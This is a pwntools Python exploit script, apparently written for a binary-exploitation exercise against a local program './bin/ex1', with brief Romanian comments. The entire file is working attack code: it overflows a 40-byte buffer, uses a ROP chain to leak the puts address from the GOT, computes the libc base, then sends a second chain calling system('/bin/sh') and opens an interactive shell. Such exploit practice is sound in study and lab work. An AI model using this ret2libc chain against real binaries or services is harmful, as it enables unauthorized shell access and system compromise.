from pwn import *

target = process("./bin/ex1")  
c = context.binary = ELF("./bin/ex1", checksec=False)
rop = ROP(c)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)

offset = b"A" * 40

puts_plt = c.plt["puts"]
main_plt = c.symbols["main"]
pop_rdi_pop_rbp_ret = (rop.find_gadget(['pop rdi', 'pop rbp','ret']))[0]      # lfl ca ROPgadget --binary ./bin/ex1 | grep "pop rdi"
ret = (rop.find_gadget(["ret"]))[0]
puts_got = c.got["puts"]

target.recvuntil(b"name?")   # sare intro + what...

payload = offset + p64(pop_rdi_pop_rbp_ret) + p64(puts_got) + p64(0x0) + p64(puts_plt) + p64(main_plt)
target.sendline(payload)

target.recvline()   # pt gets(name)

raw_leak = target.recvline().strip()
log.info("raw leak: %s" % raw_leak)
leak = u64(raw_leak + b"\x00\x00")
log.info(f"Leaked LIBC address, puts: {hex(leak)}")

# get libc base address
# leak = puts real addr
libc.address = leak - libc.symbols["puts"]
log.info("LIBC base: %s" % hex(libc.address))

binsh_addr = next(libc.search(b"/bin/sh"))
system_addr = libc.sym["system"]
log.info("POP_RDI %s " % hex(pop_rdi_pop_rbp_ret))
log.info("bin/sh %s " % hex(binsh_addr))
log.info("system %s " % hex(system_addr))
payload_shell = offset + p64(ret) + p64(pop_rdi_pop_rbp_ret) + p64(binsh_addr) + p64(0x0) + p64(system_addr)

#gdb.attach(target)     # stiva multiplu 16B

target.sendline(payload_shell)
target.interactive()